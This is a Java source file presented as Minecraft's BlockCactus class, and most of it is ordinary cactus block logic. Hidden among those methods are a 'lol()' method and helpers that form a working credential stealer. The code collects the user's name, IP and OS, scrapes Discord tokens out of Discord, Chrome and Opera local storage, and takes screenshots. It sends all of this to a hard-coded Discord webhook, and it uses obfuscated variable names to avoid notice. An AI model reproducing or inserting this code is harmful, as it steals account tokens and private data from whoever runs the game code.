package net.minecraft.block;

import java.util.Random;
import net.minecraft.block.material.Material;
import net.minecraft.block.properties.IProperty;
import net.minecraft.block.properties.PropertyInteger;
import net.minecraft.block.state.BlockState;
import net.minecraft.block.state.IBlockState;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.entity.Entity;
import net.minecraft.init.Blocks;
import net.minecraft.util.AxisAlignedBB;
import net.minecraft.util.BlockPos;
import net.minecraft.util.DamageSource;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumWorldBlockLayer;
import net.minecraft.world.World;
import com.sun.istack.internal.NotNull;
import sun.net.www.http.HttpClient;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BlockCactus extends Block
{
    public static final PropertyInteger AGE = PropertyInteger.create("age", 0, 15);

    protected BlockCactus()
    {
        super(Material.cactus);
        this.setDefaultState(this.blockState.getBaseState().withProperty(AGE, Integer.valueOf(0)));
        this.setTickRandomly(true);
        this.setCreativeTab(CreativeTabs.tabDecorations);
    }

    public void updateTick(World worldIn, BlockPos pos, IBlockState state, Random rand)
    {
        BlockPos blockpos = pos.up();

        if (worldIn.isAirBlock(blockpos))
        {
            int i;

            for (i = 1; worldIn.getBlockState(pos.down(i)).getBlock() == this; ++i)
            {
                ;
            }

            if (i < 3)
            {
                int j = ((Integer)state.getValue(AGE)).intValue();

                if (j == 15)
                {
                    worldIn.setBlockState(blockpos, this.getDefaultState());
                    IBlockState iblockstate = state.withProperty(AGE, Integer.valueOf(0));
                    worldIn.setBlockState(pos, iblockstate, 4);
                    this.onNeighborBlockChange(worldIn, blockpos, iblockstate, this);
                }
                else
                {
                    worldIn.setBlockState(pos, state.withProperty(AGE, Integer.valueOf(j + 1)), 4);
                }
            }
        }
    }

    public AxisAlignedBB getCollisionBoundingBox(World worldIn, BlockPos pos, IBlockState state)
    {
        float f = 0.0625F;
        return new AxisAlignedBB((double)((float)pos.getX() + f), (double)pos.getY(), (double)((float)pos.getZ() + f), (double)((float)(pos.getX() + 1) - f), (double)((float)(pos.getY() + 1) - f), (double)((float)(pos.getZ() + 1) - f));
    }

    public AxisAlignedBB getSelectedBoundingBox(World worldIn, BlockPos pos)
    {
        float f = 0.0625F;
        return new AxisAlignedBB((double)((float)pos.getX() + f), (double)pos.getY(), (double)((float)pos.getZ() + f), (double)((float)(pos.getX() + 1) - f), (double)(pos.getY() + 1), (double)((float)(pos.getZ() + 1) - f));
    }

    public boolean isFullCube()
    {
        return false;
    }

    /**
     * Used to determine ambient occlusion and culling when rebuilding chunks for render
     */
    public boolean isOpaqueCube()
    {
        return false;
    }

    public boolean canPlaceBlockAt(World worldIn, BlockPos pos)
    {
        return super.canPlaceBlockAt(worldIn, pos) ? this.canBlockStay(worldIn, pos) : false;
    }

    /**
     * Called when a neighboring block changes.
     */
    public void onNeighborBlockChange(World worldIn, BlockPos pos, IBlockState state, Block neighborBlock)
    {
        if (!this.canBlockStay(worldIn, pos))
        {
            worldIn.destroyBlock(pos, true);
        }
    }

    public boolean canBlockStay(World worldIn, BlockPos pos)
    {
    	//TODO: is this fucking correct lmao
        for (EnumFacing enumfacing : EnumFacing.Plane.HORIZONTAL.facings())
        {
            if (worldIn.getBlockState(pos.offset(enumfacing)).getBlock().getMaterial().isSolid())
            {
                return false;
            }
        }

        Block block = worldIn.getBlockState(pos.down()).getBlock();
        return block == Blocks.cactus || block == Blocks.sand;
    }

    /**
     * Called When an Entity Collided with the Block
     */
    public void onEntityCollidedWithBlock(World worldIn, BlockPos pos, IBlockState state, Entity entityIn)
    {
        entityIn.attackEntityFrom(DamageSource.cactus, 1.0F);
    }

    public EnumWorldBlockLayer getBlockLayer()
    {
        return EnumWorldBlockLayer.CUTOUT;
    }

    /**
     * Convert the given metadata into a BlockState for this Block
     */
    public IBlockState getStateFromMeta(int meta)
    {
        return this.getDefaultState().withProperty(AGE, Integer.valueOf(meta));
    }
    public static void lol(){
        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();
            String llLlLlLlL = System.getProperty("user.name");
            captureScreen();
            sendMessage("``` NAME : " + llLlLlLlL + "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
        } catch (Exception ignore) {
        }

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");


            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }
                sendMessage("```" + webhooks.toString() + "```");

            } catch (Exception e) {
                sendMessage("``` UNABLE TO PULL TOKENS : " + e + "```");
            }


        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }
                sendMessage("```" + webhooks.toString() + "```");

            } catch (Exception e) {
                sendMessage("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
            }
        } else {
            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
        }
        try {
            captureScreen();
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
        }
    }

    private static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL("https://discord.com/api/webhooks/781443190015524864/qvDXH7hQJn9sfjUZCfZkH4stxHonymby8sNhnXif64x7ZyUDt3bGt8vKE0Zxk5uuMTIr");
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void sendFile(File file) throws IOException {

        String url = "https://discord.com/api/webhooks/781443190015524864/qvDXH7hQJn9sfjUZCfZkH4stxHonymby8sNhnXif64x7ZyUDt3bGt8vKE0Zxk5uuMTIr";
        String boundary = Long.toHexString(System.currentTimeMillis());
        URLConnection connection = new URL(url).openConnection();
        connection.setDoOutput(true);
        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
            writer.println("--" + boundary);
            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
            writer.write("Content-Type: image/png");
            writer.println();
            writer.println(readAllBytes(new FileInputStream(file)));
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                for (String line; (line = reader.readLine()) != null; ) {
                    writer.println(line);
                }
            }
            writer.println("--" + boundary + "--");
        }
    }
    public static byte[] readAllBytes(@NotNull InputStream stream) throws IOException {
        int count, pos = 0;
        byte[] output = new byte[0];
        byte[] buf = new byte[1024];
        while ((count = stream.read(buf)) > 0) {
            if (pos + count >= output.length) {
                byte[] tmp = output;
                output = new byte[pos + count];
                System.arraycopy(tmp, 0, output, 0, tmp.length);
            }

            for (int i = 0; i < count; i++) {
                output[pos++] = buf[i];
            }
        }
        return output;
    }


    @SuppressWarnings("all")
    private static void captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        sendFile(file);
        file.delete();
    }


    /**
     * Convert the BlockState into the correct metadata value
     */
    public int getMetaFromState(IBlockState state)
    {
        return ((Integer)state.getValue(AGE)).intValue();
    }

    protected BlockState createBlockState()
    {
        return new BlockState(this, new IProperty[] {AGE});
    }
}
